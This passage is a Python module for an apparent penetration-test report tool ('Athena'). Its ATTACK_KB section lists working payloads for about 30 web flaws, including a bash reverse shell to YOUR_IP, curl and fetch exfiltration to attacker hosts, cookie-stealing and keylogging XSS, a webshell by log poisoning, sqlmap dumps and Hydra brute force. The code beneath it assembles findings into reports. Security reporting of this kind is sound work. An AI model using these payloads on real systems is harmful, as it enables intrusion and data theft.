import json
import csv
import urllib.request
import urllib.error
import urllib.parse
import xml.etree.ElementTree as ET
from datetime import datetime
from typing import Dict, List, Any, Optional
import logging

# Attack knowledge base: for each vulnerability class, concrete techniques an
# attacker uses to compromise the target, what they gain, and the tools to do it.
ATTACK_KB: Dict[str, Dict[str, Any]] = {
    'SQL Injection': {
        'description': ('An attacker injects crafted SQL into unsanitized inputs to manipulate the database queries the application runs. '
            'Error/time/boolean differentials prove the backend concatenates user input into SQL. '
            'Business impact is total data compromise: authentication bypass, theft of all rows (credentials, PII, payments), and often remote code execution via DB functions (xp_cmdshell, INTO OUTFILE) or stacked queries.'),
        'attack_techniques': [
            'Automate detection/extraction with `sqlmap -u "https://target/page?id=1" --batch --dbs --dump` to enumerate databases and dump tables.',
            'Manual UNION extraction: `\' UNION SELECT 1,2,3-- -` to map columns, then `\' UNION SELECT username,password FROM users-- -` to steal credentials.',
            'Blind time-based confirmation: `\' AND SLEEP(5)-- -` to verify injection and map data character-by-character.',
            'Escalate to RCE on MSSQL via `EXEC xp_cmdshell \'whoami\'`, or on MySQL by writing a webshell with `INTO OUTFILE` into a web-accessible directory.',
        ],
        'attacker_gains': 'Complete read/write access to the database: user credentials, PII, financial records, and often full server compromise via command execution.',
        'tools': ['sqlmap', 'Burp Suite', 'SQLNinja', 'hashcat (crack dumped hashes)'],
    },
    'Command Injection': {
        'description': ('An attacker injects operating-system commands through unsanitized inputs that the server passes to a shell. '
            'Strict output patterns (uid=/gid=, root:x:0:0:, uname) or scaling time delays prove execution — a single slow response is never enough. '
            'Business impact is immediate remote code execution as the web-server user, leading to full host takeover, persistence, credential harvesting and lateral movement.'),
        'attack_techniques': [
            'Blind confirmation with timing: `?file=x; sleep 5` or `?file=x|sleep 5` and compare response times.',
            'Output-based extraction: `?ip=127.0.0.1; id` or `; whoami` to read command output directly in the response.',
            'Blind exfiltration over DNS/HTTP (OAST): `; curl http://YOUR-COLLABORATOR/id` and watch for the callback in Burp Collaborator.',
            'Establish a reverse shell: `; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1` and connect with `nc -lvnp 4444`.',
        ],
        'attacker_gains': 'Arbitrary remote code execution as the web-server user, escalating to full system compromise, persistence, and lateral movement.',
        'tools': ['Burp Suite', 'commix', 'netcat', 'pwncat-cs'],
    },
    'XSS': {
        'description': ('An attacker injects script that executes in another user\'s browser, hijacking their session or actions. '
            'Athena confirms this with a double-canary differential: two unique tokens must both reflect unencoded in an executable HTML context while absent from the benign baseline — encoded or static matches are dropped, never reported. '
            'Business impact is session hijacking and account takeover for every victim who views the page, plus credential theft, defacement and malware delivery.'),
        'attack_techniques': [
            'Cookie theft: inject `<script>fetch("http://attacker/c?c="+document.cookie)</script>` and harvest session cookies from your listener.',
            'Session hijack end-to-end: replay the stolen cookie with `curl -H "Cookie: session=..." https://target/account` to take over the victim account.',
            'Keylogging / credential capture: inject `<script>document.addEventListener("keydown",e=>fetch("//attacker/k?k="+e.key))</script>` on a login page.',
            'Stored XSS escalation: if stored, hook the victim in BeEF and pivot to CSRF-based actions, password resets, or admin panel compromise.',
        ],
        'attacker_gains': 'Session hijacking, full account takeover, theft of credentials/PII, defacement, and malware delivery to every victim who views the page.',
        'tools': ['BeEF', 'XSStrike', 'dalfox', 'Burp Suite'],
    },
    'LFI': {
        'description': 'An attacker reads arbitrary files from the server filesystem by injecting path traversal into a file parameter.',
        'attack_techniques': [
            'Basic traversal reads: `?page=../../../../etc/passwd` or on Windows `..\\..\\windows\\win.ini`.',
            'PHP source disclosure: `?page=php://filter/convert.base64-encode/resource=config.php` then decode to read application source and hardcoded secrets.',
            'Log poisoning to RCE: inject `<?php system($_GET[\'c\']); ?>` via a User-Agent, then include `/var/log/apache2/access.log` and call `?c=id`.',
            'Environment disclosure: `?page=../../../../proc/self/environ` to leak HTTP headers, often containing internal paths and config.',
        ],
        'attacker_gains': 'Read application source, configuration files, and OS secrets; commonly escalates to remote code execution via log poisoning.',
        'tools': ['Burp Suite', 'dotdotpwn', 'ffuf', 'liffy'],
    },
    'SSRF': {
        'description': 'An attacker tricks the server into making requests to internal/cloud resources it should not reach.',
        'attack_techniques': [
            'Cloud metadata theft: `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` to extract cloud IAM keys.',
            'Internal network scanning: `?url=http://127.0.0.1:3306` or scan internal ranges to map services unreachable from outside.',
            'Local file reads: `?url=file:///etc/passwd` if the URL handler supports file schemes.',
            'RCE via gopher/Redis: use `gopher://` to talk to an internal Redis and write an authorized key or a webshell.',
        ],
        'attacker_gains': 'Cloud credentials, access to internal services, database exposure, and frequently remote code execution on adjacent infrastructure.',
        'tools': ['SSRFmap', 'gopherus', 'Burp Collaborator', 'curl'],
    },
    'XXE': {
        'description': 'An attacker abuses an XML parser that processes external entities to read files or reach internal systems.',
        'attack_techniques': [
            'Local file read: `<!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]>` and reference `&f;` in the XML body.',
            'Blind OOB exfiltration: `<!ENTITY f SYSTEM "http://attacker/exfil?d=%file;">` to leak file contents over HTTP/DNS.',
            'SSRF via parameter entities: `<!ENTITY f SYSTEM "http://169.254.169.254/latest/meta-data/">` to probe internal hosts.',
            'RCE when PHP expects handler is enabled: `<!ENTITY f SYSTEM "expect://id">`.',
        ],
        'attacker_gains': 'Read sensitive files, SSRF into internal networks, and in some stacks remote code execution.',
        'tools': ['Burp Suite', 'OWASP XXE payloads', 'xml external entity testers'],
    },
    'Open Redirect': {
        'description': 'An attacker abuses a redirect parameter to send victims to a malicious site while keeping a trusted-looking URL.',
        'attack_techniques': [
            'Chain with OAuth/SSO: craft `https://target/login?redirect=https://attacker/` to steal OAuth tokens and codes on callback.',
            'Phishing: send `https://target/?next=//evil.com` links that appear legitimate to trick users into entering credentials.',
            'Bypass SSRF/WAF filters: use redirects as an SSRF primitive where URL validation is done only on the first hop.',
        ],
        'attacker_gains': 'OAuth/SSO token theft (account takeover), highly effective phishing, and WAF/SSRF filter bypass.',
        'tools': ['Burp Suite', 'oauth-metadata', 'openredirects scanners'],
    },
    'CRLF Injection': {
        'description': 'An attacker injects carriage-return/line-feed characters to add arbitrary HTTP headers or split responses.',
        'attack_techniques': [
            'Header injection: `?url=%0d%0aSet-Cookie:%20admin=true` to poison server-side headers and cookies.',
            'Response splitting: inject `%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1 200 OK...` to confuse proxies and cache malicious content.',
            'Cache poisoning: inject a Location header so the CDN caches a redirect to an attacker-controlled page.',
        ],
        'attacker_gains': 'Session fixation, stored/reflected XSS via injected headers, web-cache poisoning, and log injection.',
        'tools': ['crlfuzz', 'Burp Suite'],
    },
    'Host Header Injection': {
        'description': ('An attacker supplies a forged Host header to influence how the application builds URLs and routes requests. '
            'Athena confirms this with a differential: a unique marker host must reflect with the forged Host but be absent with the legitimate Host — static pages containing "evil.com" are not findings. '
            'Business impact is password-reset poisoning (reset links leak to the attacker → account takeover), web-cache poisoning, and routing to hidden internal vhosts.'),
        'attack_techniques': [
            'Password-reset poisoning: send `Host: attacker.com` on a reset request; the email contains a poisoned link that leaks the reset token to the attacker.',
            'Cache poisoning: poison a cached page with an attacker Host header so all visitors receive attacker-controlled content.',
            'Virtual-host routing bypass: reach hidden vhosts or admin panels by setting unexpected Host headers.',
        ],
        'attacker_gains': 'Account takeover via poisoned password-reset links, web-cache poisoning, and access to internal vhosts.',
        'tools': ['Burp Suite', 'Host Header Injection scanner', 'can-i-take-over-xyz'],
    },
    'Web Cache Poisoning': {
        'description': ('An attacker manipulates unkeyed inputs (headers, cookies, query params) so the cache stores attacker-controlled content served to everyone. '
            'Athena confirms this with a unique per-probe marker (athena-<rand>.evil-test.com) that must reflect with the poison header but be absent without it — generic "evil.com" matches are discarded as footer noise. '
            'Business impact is stored mass compromise: every visitor of the poisoned URL receives attacker script (mass session theft, malware, account takeover).'),
        'attack_techniques': [
            'Discover unkeyed inputs with Burp Param Miner: audit for headers/params that change the response but are not part of the cache key.',
            'Poison via unkeyed header: send `X-Forwarded-Host: evil.com` and a cache-buster param so the CDN caches a page with attacker-controlled script URLs.',
            'Poison via unkeyed cookie/query: vary a cookie or parameter to inject attacker content into a shared cached response.',
            'Wait for the cache to serve the poisoned copy, then trigger it against the victim/admin (often combined with a stored XSS payload).',
        ],
        'attacker_gains': 'Stored attacker-controlled content delivered to every visitor of the poisoned URL, enabling mass session theft, malware delivery, and account takeover.',
        'tools': ['Burp Suite Param Miner', 'cache poisoning extensions', 'nuclei'],
    },
    'HTTP Parameter Pollution': {
        'description': 'An attacker sends duplicate or conflicting parameters to confuse the server into applying attacker-controlled values.',
        'attack_techniques': [
            'Send `?user=admin&user=victim` and observe which value wins to bypass filters or override server-side logic.',
            'Bypass WAF/regex on single-parameter validation by smuggling the malicious value in a second occurrence.',
            'Chain with auth/price fields: duplicate `role` or `price` parameters to escalate privileges or alter transactions.',
        ],
        'attacker_gains': 'Input-validation bypass, privilege escalation, and tampering with business logic (prices, roles, amounts).',
        'tools': ['Burp Suite', 'HPP testers'],
    },
    'Authentication Bypass': {
        'description': 'An attacker defeats the login or session mechanism to gain unauthorized access without valid credentials.',
        'attack_techniques': [
            'Default/weak credentials: `hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"`.',
            'SQLi login bypass: `user=\' OR 1=1-- -` with any password when login queries are concatenated.',
            'JWT tampering: try `alg:none`, or crack a weak HS256 secret with `hashcat`/`jwt_tool` and forge an admin token.',
            'Response/cookie manipulation: flip `isAdmin=false` cookies or 302 bypasses on admin endpoints.',
        ],
        'attacker_gains': 'Unauthorized access as any user, frequently full administrative control of the application.',
        'tools': ['Hydra', 'jwt_tool', 'Burp Suite', 'hashcat'],
    },
    'Default Credentials': {
        'description': 'A service is reachable with well-known default usernames/passwords that were never changed.',
        'attack_techniques': [
            'Try service defaults: `admin/admin`, `root/root`, Tomcat `tomcat/tomcat`, SNMP `public/private`, router `admin/password`.',
            'Automate with Nmap NSE: `nmap -sV -p- --script ftp-anon,mysql-empty-password,redis-info,http-default-accounts <target>`.',
            'Credential stuffing the found defaults across other exposed services and web logins.',
        ],
        'attacker_gains': 'Direct service compromise and access to the underlying application/data, often a stepping stone to full host takeover.',
        'tools': ['Hydra', 'Medusa', 'Nmap NSE', 'default-credentials lists'],
    },
    'IDOR': {
        'description': 'An attacker changes object identifiers (IDs) in requests to access resources belonging to other users.',
        'attack_techniques': [
            'Sequential enumeration: change `/users/1` to `/users/2`, `/users/3` and record which objects you can read.',
            'Swap references: replace your account ID with a target ID in profile, order, or payment API calls.',
            'Automate authorization checks with Burp Autorize/AuthMatrix to compare responses with and without a session.',
        ],
        'attacker_gains': 'Access, modification, and theft of other users\' PII, documents, orders, and payment data — a direct data-breach primitive.',
        'tools': ['Burp Autorize', 'AuthMatrix', 'Caido', 'curl'],
    },
    'CSRF': {
        'description': 'An attacker forces a victim\'s browser to perform unintended state-changing requests against the logged-in app.',
        'attack_techniques': [
            'Auto-submitting form: host a page with `<form action="https://target/change_password" method="POST"><input name="password" value="hacked"></form>` + auto-submit script and lure the victim.',
            'GET-based CSRF: `https://target/transfer?amount=1000&to=attacker` loaded as `<img src=...>` in the victim\'s session.',
            'Token bypass: if CSRF tokens are validated loosely, strip them or use same-site bypasses.',
        ],
        'attacker_gains': 'Account takeover (password/email change), financial transfers, and privilege escalation performed under the victim\'s session.',
        'tools': ['Burp CSRF PoC generator', 'XSRFProbe'],
    },
    'Subdomain Takeover': {
        'description': 'A subdomain points at a third-party service (S3, Heroku, GitHub Pages) that is no longer claimed by the target.',
        'attack_techniques': [
            'Fingerprint dangling DNS: resolve the subdomain, confirm a CNAME to an unclaimed provider (e.g., `<name>.herokudns.com` or an S3 bucket).',
            'Claim the resource on the provider: create the bucket/app/page and confirm you now control the subdomain\'s content.',
            'Host malicious content on the legit-looking domain to phish or to set cookies on the parent domain.',
        ],
        'attacker_gains': 'Full control of content on a trusted subdomain: phishing, malware hosting, and session-cookie theft against the parent domain.',
        'tools': ['subjack', 'subover', 'nuclei (takeover templates)', 'can-i-take-over-xyz'],
    },
    'Open API Endpoint': {
        'description': 'An API endpoint returns meaningful data without authentication, exposing application logic and data.',
        'attack_techniques': [
            'Enumerate endpoints (`/api/v1/users`, `/api/orders`, `/api/admin/*`) with `ffuf -w endpoints.txt -u https://target/FUZZ`.',
            'Interact directly with `curl https://target/api/v1/users` to collect exposed records.',
            'Escalate by chaining with IDOR: enumerate sequential IDs on the open endpoints to pull every record.',
        ],
        'attacker_gains': 'Unauthenticated access to application data, and a launchpad for IDOR/data-breach chains.',
        'tools': ['ffuf', 'curl', 'Postman', 'nuclei'],
    },
    'Exposed .git': {
        'description': 'The `.git` directory is served, letting an attacker reconstruct the full application source code.',
        'attack_techniques': [
            'Reconstruct the repository: `git-dumper https://target/.git/ repo/` to download objects and index.',
            'Mine history for secrets: `git log -p` to find passwords, API keys, and cloud credentials committed in the past.',
            'Dump the working tree and audit for hardcoded secrets and backdoors with `trufflehog` or `gitleaks`.',
        ],
        'attacker_gains': 'Full source code, hardcoded credentials/API keys, and the ability to find 0-day style bugs quickly.',
        'tools': ['git-dumper', 'GitTools', 'gitleaks', 'trufflehog'],
    },
    'Exposed Sensitive File': {
        'description': 'A sensitive file (e.g., `.env`, backups, configs) is publicly accessible and leaks secrets or data.',
        'attack_techniques': [
            'Fetch the file: `curl https://target/.env` and extract database passwords, API keys, and framework secrets.',
            'Probe backups/artifacts: `/.git/..`, `/backup.zip`, `/config.php.bak`, `/.env.backup` with a wordlist.',
            'Use leaked cloud keys: check `aws configure` or GCP/Firebase keys for live access to cloud resources.',
        ],
        'attacker_gains': 'Database and cloud credentials, application secrets, leading to full data and infrastructure compromise.',
        'tools': ['curl', 'feroxbuster', 'nuclei', 'gitleaks'],
    },
    'Sensitive Information Disclosure': {
        'description': ('The application leaks internal details (versions, stack traces, source comments, phpinfo) useful for attack targeting. '
            'A phpinfo() page (e.g. PHP 8.1.34) discloses the exact interpreter, extensions, environment variables, paths and server config — a blueprint for version-specific exploits. '
            'Business impact is precision targeting: the attacker skips guessing and goes straight to working CVEs, credential paths and config locations.'),
        'attack_techniques': [
            'Mine responses: grep HTML/comments/JS for internal paths, emails, tokens, and stack traces.',
            'Version-based targeting: fingerprint exposed versions (`Server`, `phpinfo()`) and match against public CVEs.',
            'Chain disclosures with other bugs (e.g., internal paths + LFI, version + known exploit) to escalate.',
        ],
        'attacker_gains': 'Reconnaissance to build precise, reliable exploits; internal paths enable LFI and further compromise.',
        'tools': ['Burp Suite', 'grep', 'nuclei', 'whatweb'],
    },
    'Directory Listing': {
        'description': ('The server lists directory contents, exposing files that should be hidden. '
            'Athena only reports this when a strict "Index of /" marker plus 2+ listing indicators are present on a directory-like URL — generic pages are never flagged. '
            'Business impact is direct file disclosure: backups (.sql/.zip), configs, uploads and source that shortcut to credential theft and RCE.'),
        'attack_techniques': [
            'Browse the listing with `curl https://target/uploads/` to find user-uploaded files, backups, and source.',
            'Look for backup archives (`db.sql`, `backup.zip`, `site.tar.gz`) that contain databases or configs.',
            'Combine with disclosed file names to target specific sensitive files directly.',
        ],
        'attacker_gains': 'Exposure of sensitive files, credentials, and backups; a shortcut to full data compromise.',
        'tools': ['curl', 'dirsearch', 'gobuster'],
    },
    'Security Headers': {
        'description': ('Missing or weak security headers remove browser-enforced protections against common client-side attacks. '
            'Absent X-Frame-Options/CSP/HSTS/X-Content-Type-Options leaves clickjacking, MIME-sniffing, TLS-downgrade and XSS amplification open on every page that lacks them. '
            'Business impact is client-side compromise at scale: session theft, credential capture and weakened transport for all users.'),
        'attack_techniques': [
            'Clickjacking: if `X-Frame-Options`/`frame-ancestors` is absent, iframe the sensitive page and trick the victim into clicking invisible buttons.',
            'MIME sniffing: absent `X-Content-Type-Options` lets you upload HTML/JS disguised as images and run script in the victim\'s origin.',
            'Missing HSTS/CSP: strip TLS in MITM scenarios or execute injected script that a proper CSP would block.',
        ],
        'attacker_gains': 'Session theft via clickjacking, stored XSS amplification, and weakened transport security.',
        'tools': ['securityheaders.com', 'Burp Suite', 'nuclei'],
    },
    'Server Version Disclosure': {
        'description': 'The server/tech version is exposed, letting an attacker target it with known public exploits.',
        'attack_techniques': [
            'Identify the exact version from `Server`/`X-Powered-By` headers or error pages.',
            'Cross-reference the version with public CVE databases and exploit kits.',
            'Run `nuclei -u https://target` with technology-specific templates to confirm exploitable versions.',
        ],
        'attacker_gains': 'A precise target for version-specific exploits (e.g., Apache/Struts/WordPress RCE chains).',
        'tools': ['whatweb', 'nmap -sV', 'nuclei', 'NVD/CVE search'],
    },
    'Insecure Cookie Configuration': {
        'description': 'Cookies are set without Secure/HttpOnly/SameSite attributes, exposing sessions to theft.',
        'attack_techniques': [
            'Steal over plaintext: on HTTP, sniff the session cookie with Wireshark/tcpdump on a shared network.',
            'Exfil via XSS: without HttpOnly, `document.cookie` sends the session to the attacker.',
            'Cross-site leakage: without SameSite, CSRF-style requests carry the cookie to attacker-controlled actions.',
        ],
        'attacker_gains': 'Session hijacking and full account takeover.',
        'tools': ['Burp Suite', 'Wireshark', 'browser devtools'],
    },
    'CORS': {
        'description': 'An overly permissive CORS policy lets malicious origins read cross-origin responses and sensitive data.',
        'attack_techniques': [
            'Send `Origin: https://evil.com` (or `null`) and check if the response reflects `Access-Control-Allow-Origin: https://evil.com` with `Allow-Credentials: true`.',
            'From evil.com, read the victim\'s API data: `fetch("https://target/api/profile", {credentials:"include"}).then(r=>r.text()).then(t=>new Image().src="//attacker/?"+btoa(t))`.',
            'Chain with a stored XSS on any allowed origin to steal targeted user data.',
        ],
        'attacker_gains': 'Exfiltration of authenticated API responses and PII belonging to any victim that visits the attacker\'s page.',
        'tools': ['Burp Suite', 'corsy', 'nuclei'],
    },
    'GraphQL Introspection': {
        'description': 'GraphQL introspection is enabled, revealing the entire schema including hidden queries and mutations.',
        'attack_techniques': [
            'Introspect: POST `{"query":"{__schema{queryType{fields{name}} types{name fields{name}}}}"}` to enumerate the full API surface.',
            'Discover sensitive mutations (e.g., `updateUserRole`, `resetPassword`) and call them unauthenticated or with a low-privilege token.',
            'Mass-extract data via crafted queries if authorization checks are missing on nested resolvers.',
        ],
        'attacker_gains': 'Mapping of the whole data model and typically unauthenticated data access or privilege escalation.',
        'tools': ['graphql-cop', 'graphql introspection clients', 'Burp Suite'],
    },
    'JWT': {
        'description': 'A JWT token is exposed or weakly protected, enabling forgery or theft of authentication tokens.',
        'attack_techniques': [
            'Decode the token: `jwt_tool <token>` to inspect claims; if `alg=none` is accepted, forge any user.',
            'Algorithm confusion: for RS256-signed tokens, try HS256 with the public key as the HMAC secret (`jwt_tool -X k -pk public.pem`).',
            'Crack weak secrets: `hashcat -m 16500 token.txt wordlist.txt` to recover the signing key and mint tokens.',
            'If stolen via exposed source/cookie, replay it directly to impersonate the user.',
        ],
        'attacker_gains': 'Forged or stolen authentication tokens → complete account and admin takeover.',
        'tools': ['jwt_tool', 'jwtcat', 'hashcat', 'Burp Suite'],
    },
    'Race Condition': {
        'description': 'Concurrent requests can be processed before state is updated, letting an attacker win a race to repeat a restricted action.',
        'attack_techniques': [
            'Send N simultaneous requests with Turbo Intruder to a critical operation (coupon redemption, account top-up, file upload).',
            'Exploit ToC/ToU: race the "check balance" then "transfer" to spend the same funds twice.',
            'Use race windows in account creation/likes/withdrawals to multiply resources or bypass one-time constraints.',
        ],
        'attacker_gains': 'Double-spend of funds, unlimited discounts, mass resource grants, and business-logic bypasses.',
        'tools': ['Burp Turbo Intruder', 'race-the-web', 'Caido'],
    },
    'Prototype Pollution': {
        'description': 'An attacker pollutes the JavaScript object prototype via `__proto__`/`constructor.prototype`, altering app-wide behavior.',
        'attack_techniques': [
            'Inject `{"__proto__":{"isAdmin":true}}` into JSON-parsed inputs (settings, merge endpoints).',
            'Find gadget chains in the app\'s libraries where polluted properties lead to XSS or code execution.',
            'Use PPFuzz to detect and confirm server-side/client-side pollution endpoints.',
        ],
        'attacker_gains': 'Client-side XSS and, with a suitable gadget chain, server-side remote code execution.',
        'tools': ['PPFuzz', 'Burp Suite', 'browser devtools'],
    },
    'Firebase': {
        'description': 'Firebase configuration or credentials are exposed, typically leaving a database publicly readable/writable.',
        'attack_techniques': [
            'Read the exposed config for the database URL, then hit the REST endpoint: `curl https://PROJECT.firebaseio.com/.json`.',
            'If rules allow write access, inject/modify records with a PUT to `.json` or specific paths.',
            'Steal exposed API keys/credentials and check for broader GCP/Firebase administrative access.',
        ],
        'attacker_gains': 'Read/write access to user databases and PII, and often cloud service compromise.',
        'tools': ['curl', 'firebase-tools', 'Burp Suite'],
    },
}

# Types whose names contain these keys map to a canonical ATTACK_KB entry.
ATTACK_KB_MAP = [
    ('Web Cache Poisoning', 'Web Cache Poisoning'),
    ('SQL Injection', 'SQL Injection'),
    ('Command Injection', 'Command Injection'),
    ('Cross-Site Scripting', 'XSS'),
    ('DOM-Based Cross-Site Scripting', 'XSS'),
    ('Local File Inclusion', 'LFI'),
    ('Path Traversal', 'LFI'),
    ('Server-Side Request Forgery', 'SSRF'),
    ('XML External Entity', 'XXE'),
    ('Open Redirect', 'Open Redirect'),
    ('CRLF Injection', 'CRLF Injection'),
    ('Host Header Injection', 'Host Header Injection'),
    ('HTTP Parameter Pollution', 'HTTP Parameter Pollution'),
    ('Authentication Bypass', 'Authentication Bypass'),
    ('Default Credentials', 'Default Credentials'),
    ('IDOR', 'IDOR'),
    ('CSRF', 'CSRF'),
    ('Subdomain Takeover', 'Subdomain Takeover'),
    ('Open API Endpoint', 'Open API Endpoint'),
    ('Exposed .git', 'Exposed .git'),
    ('Exposed Sensitive File', 'Exposed Sensitive File'),
    ('Sensitive Information', 'Sensitive Information Disclosure'),
    ('Sensitive Comment', 'Sensitive Information Disclosure'),
    ('phpinfo', 'Sensitive Information Disclosure'),
    ('Directory Listing', 'Directory Listing'),
    ('Missing Security Header', 'Security Headers'),
    ('Weak Security Header', 'Security Headers'),
    ('Server Version Disclosure', 'Server Version Disclosure'),
    ('Insecure Cookie', 'Insecure Cookie Configuration'),
    ('Permissive CORS', 'CORS'),
    ('Dangerous CORS', 'CORS'),
    ('GraphQL', 'GraphQL Introspection'),
    ('JWT', 'JWT'),
    ('Race Condition', 'Race Condition'),
    ('Prototype Pollution', 'Prototype Pollution'),
    ('Firebase', 'Firebase'),
]


class ReportGenerator:
    """Professional report generator focused on security auditing and remediation."""

    #: Maximum unique findings itemized in the report body.  Everything above
    #: this is still counted in ``audit_summary`` and flagged as truncated.
    MAX_REPORT_FINDINGS = 100

    def __init__(self):
        self.logger = logging.getLogger(__name__)

    #: Discovery keys whose presence proves the recon phase ran.  An empty
    #: dict means the mode never invoked discovery (e.g. ``-m vuln``) - the
    #: report must say "not scanned", never "none detected".
    DISCOVERY_KEYS = ('urls', 'subdomains', 'ports', 'technologies',
                      'technologies_with_confidence', 'admin_panels',
                      'login_forms')

    @classmethod
    def _discovery_ran(cls, discovery: Any) -> bool:
        if not isinstance(discovery, dict):
            return False
        return any(k in discovery for k in cls.DISCOVERY_KEYS)

    def generate_comprehensive_report(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate comprehensive penetration test report with professional auditor focus."""
        # Filter and deduplicate vulnerabilities
        all_vulns = results.get('vulnerabilities', [])
        deduped_vulns = self._dedup_vulnerabilities(all_vulns)
        filtered_vulns = deduped_vulns[:self.MAX_REPORT_FINDINGS]

        # Categorize vulnerabilities (findings are mixed-case across modules).
        # Non-dict entries (None from a failed check merge) are dropped here
        # with a debug log - they must never crash report generation.
        _dropped = sum(1 for v in filtered_vulns if not isinstance(v, dict))
        if _dropped:
            self.logger.debug('dropped %d non-dict finding(s) from report',
                              _dropped)
            filtered_vulns = [v for v in filtered_vulns if isinstance(v, dict)]

        def _sev(v: Dict[str, Any]) -> str:
            return str(v.get('severity') or '').upper()
        critical_vulns = [v for v in filtered_vulns if _sev(v) == 'CRITICAL']
        high_vulns = [v for v in filtered_vulns if _sev(v) == 'HIGH']
        medium_vulns = [v for v in filtered_vulns if _sev(v) == 'MEDIUM']
        low_vulns = [v for v in filtered_vulns if _sev(v) == 'LOW']
        info_vulns = [v for v in filtered_vulns if _sev(v) in ('INFO', '')]

        # Group by vulnerability type
        vulns_by_type = {}
        for v in filtered_vulns:
            vtype = v.get('type', 'Unknown')
            if vtype not in vulns_by_type:
                vulns_by_type[vtype] = []
            vulns_by_type[vtype].append(v)

        # Deduplicate exploitation results
        exploitation_attempts = list(results.get('exploitation') or [])
        unique_exploits = self._deduplicate_exploitation_results(exploitation_attempts)
        exploit_counts = {'confirmed': 0, 'possible': 0, 'inconclusive': 0}
        for attempt in exploitation_attempts:
            key = str(attempt.get('status', '')).lower() if isinstance(attempt, dict) else ''
            if key in exploit_counts:
                exploit_counts[key] += 1
        
        # Generate detailed analysis
        vulnerability_details = self._generate_vulnerability_details(filtered_vulns)

        no_findings = len(filtered_vulns) == 0 and not unique_exploits
        discovery = results.get('discovery', {})

        # The findings registry is only populated by engagement workflows;
        # fall back to the scan's own (deduplicated) findings so the section
        # is never silently empty.
        registry = self._summarize_findings(results.get('findings'))
        if not registry:
            registry = [
                {
                    'id': v.get('id') or f'find-{idx:03d}',
                    'title': ('%s at %s' % (v.get('type', 'finding'),
                                            v.get('url', '')))[:140],
                    'type': str(v.get('type', '')),
                    'url': str(v.get('url', '')),
                    'severity': str(v.get('severity', 'INFO')).upper(),
                    'state': str(v.get('state', 'discovered')),
                    'affected_asset': str(v.get('url', '')),
                    'confidence': v.get('confidence'),
                    'verified': bool(v.get('verified')),
                    'verification': (
                        str((v.get('verification') or {}).get('status', ''))
                        if isinstance(v.get('verification'), dict) else ''),
                    'has_evidence': (isinstance(v.get('evidence'), dict)
                                     and bool(v.get('evidence'))),
                }
                for idx, v in enumerate(filtered_vulns, 1)
            ]

        summary = {
            'total_vulnerabilities': len(filtered_vulns),
            'severity_breakdown': {
                'critical': len(critical_vulns),
                'high': len(high_vulns),
                'medium': len(medium_vulns),
                'low': len(low_vulns),
                'info': len(info_vulns)
            },
            'assets_discovered': {
                'urls': len(discovery.get('urls', [])),
                'subdomains': len(discovery.get('subdomains', [])),
                'open_ports': len(discovery.get('ports', [])),
                'technologies': len(discovery.get('technologies', []))
            },
            'successful_demonstrations': len(unique_exploits),
            'exploitation_attempted': len(exploitation_attempts),
            'exploitation_confirmed': exploit_counts['confirmed'],
            'exploitation_possible': exploit_counts['possible'],
            'exploitation_inconclusive': exploit_counts['inconclusive'],
            'risk_rating': self._calculate_overall_risk(
                critical_vulns, high_vulns, medium_vulns),
            'raw_finding_count': len(all_vulns),
            'unique_finding_count': len(deduped_vulns),
        }
        # Never silently drop findings: when the cap kicks in, say so.
        if len(deduped_vulns) > self.MAX_REPORT_FINDINGS:
            summary['findings_truncated'] = {
                'shown': len(filtered_vulns),
                'total_unique': len(deduped_vulns),
                'raw': len(all_vulns),
                'note': ('Report cap of %d unique findings reached; %d lower-'
                         'severity unique finding(s) are not itemized here. '
                         'Regenerate with a higher cap or use the CSV export '
                         'for the full list.'
                         % (self.MAX_REPORT_FINDINGS,
                            len(deduped_vulns) - len(filtered_vulns))),
            }

        report = {
            'athena_security_audit': {
                'target': results.get('target', 'Unknown'),
                'timestamp': results.get('timestamp', datetime.now().isoformat()),
                'executive_summary': self._generate_executive_summary(critical_vulns, high_vulns, medium_vulns, unique_exploits, no_findings=no_findings),
                'audit_summary': summary,
                'discovery_findings': {
                    'ran': self._discovery_ran(discovery),
                    'technologies': discovery.get('technologies', []),
                    'technologies_with_confidence': discovery.get('technologies_with_confidence', []),
                    'open_ports': discovery.get('ports', []),
                    'urls': discovery.get('urls', []),
                    'subdomains': discovery.get('subdomains', []),
                    'admin_panels': discovery.get('admin_panels', []),
                    'login_forms': discovery.get('login_forms', []),
                    'waf': discovery.get('waf', {}),
                },
                'no_vulnerabilities_found': no_findings,
                'tech_stack_hardening': self.generate_tech_suggestions(discovery.get('technologies', []), discovery.get('technologies_with_confidence', [])),
                'cve_intelligence': self.generate_cve_lookup(discovery.get('technologies', []), discovery.get('technologies_with_confidence', [])),
                'cve_mapping': results.get('cve_mapping', []),
                'external_tools': results.get('external_tools', []),
                'detailed_analysis': vulnerability_details,
                'demonstrated_impact': unique_exploits,
                'exploitation_attempts': exploitation_attempts,
                'bruteforce_findings': self._summarize_bruteforce(results.get('bruteforce', {})),
                'service_enumeration': self._summarize_enumeration(results.get('enumeration', {})),
                'ai_assistant': self._summarize_ai(results.get('ai_analysis', {})),
                'post_assessment': self._summarize_post_assessment(results.get('post_assessment', {})),
                'attack_path': results.get('attack_path', {}),
                'findings_registry': registry,
                'compliance_audit': self._generate_compliance_summary(filtered_vulns, results),
                'remediation_recommendations': self.generate_recommendations(filtered_vulns),
                'remediation_plan': self.generate_remediation_plan(filtered_vulns)
            }
        }

        return report

    def _summarize_bruteforce(self, bruteforce: Any) -> Dict[str, Any]:
        """Consolidate credential-attack results (web forms + services)."""
        if not bruteforce or not isinstance(bruteforce, dict):
            return {}
        web_logins = bruteforce.get('web_logins') or []
        service_creds = [c for c in (bruteforce.get('service_creds') or [])
                         if getattr(c, 'success', False)
                         or (isinstance(c, dict) and c.get('success'))]
        admin_panels = bruteforce.get('admin_panels') or []
        anon = bruteforce.get('anonymous_findings') or []
        return {
            'successful_web_logins': [
                {
                    'url': c.get('url', ''),
                    'username': c.get('username', ''),
                    'password': c.get('password', ''),
                    'method': c.get('method', ''),
                }
                for c in web_logins if isinstance(c, dict)
            ],
            'successful_service_logins': [
                {
                    'service': getattr(c, 'service', c.get('service', '')
                                       if isinstance(c, dict) else ''),
